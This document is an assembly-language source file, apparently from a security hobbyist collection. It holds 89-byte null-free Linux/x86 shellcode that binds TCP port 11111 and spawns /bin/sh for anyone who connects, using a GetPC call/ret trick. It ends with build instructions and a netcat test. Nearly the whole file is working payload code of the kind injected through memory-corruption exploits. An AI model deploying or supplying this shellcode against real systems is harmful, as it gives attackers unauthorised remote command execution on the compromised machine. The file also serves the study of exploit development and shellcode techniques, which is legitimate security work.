; Shell Bind TCP (GetPC/Call/Ret Method) - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   shell_bind_tcp_getpc
;
;   * 89 bytes
;   * null-bytes free
;   * uses GetPC method for fun and profit
;
;
;   # nasm -f elf32 shell_bind_tcp_getpc.asm -o shell_bind_tcp_getpc.o
;   # ld -m elf_i386 shell_bind_tcp_getpc.o -o shell_bind_tcp_getpc
;   # ./shell_bind_tcp_getpc
;
;   Testing
;   # nc 127.0.0.1 11111


global _start

section .text

_start:

	call $+4
	ret
	pop ebp

	; opcode value is counted starting in the pop ebp offset until interruption offset
	lea ebp, [ebp+74]

	; Creating the socket file descriptor
	; socket(2, 1, 0)

	xor eax, eax

	cdq
	push 1
	pop ebx

	; socket arguments
	push edx
	push ebx
	push 2

	call ebp

	; Biding the socket with an address type
	; bind(sockfd, [2, port, 0], 16)

	xchg esi, eax

	pop ebx

	; sockaddr_in struct
	push edx
	push WORD 0x672b	; port number
	push bx

	mov ecx, esp

	; bind arguments
	push 16
	push ecx
	push esi

	call ebp

	; Preparing to listen the incoming connection (passive socket)
	; listen(sockfd, 0)

	inc ebx
	inc ebx

	push edx
	push esi

	call ebp

	; Accepting the incoming connection
	; accept(sockfd, 0, 0)

	inc ebx

	push edx
	push edx
	push esi

	call ebp


	; Creating a interchangeably copy of the 3 file descriptors (stdin, stdout, stderr)
	; dup2 (clientfd, fd)

	xchg eax, ebx
	pop ecx

dup_loop:
        mov al, 63
        int 0x80

        dec ecx
        jns dup_loop		; looping (2, 1, 0)


	; Finally, using execve to substitute the actual process with /bin/sh
        ; execve("/bin/sh", ["/bin/sh", 0], 0)
        mov al, 11

        push edx
        push 0x68732f2f         ; "//sh"
        push 0x6e69622f         ; "/bin"

        mov ebx, esp
        push edx
        push ebx

	jmp final


interruption:

	pop edi

	push 102
	pop eax

final:
	mov ecx, esp
	int 0x80

	push edi

	ret
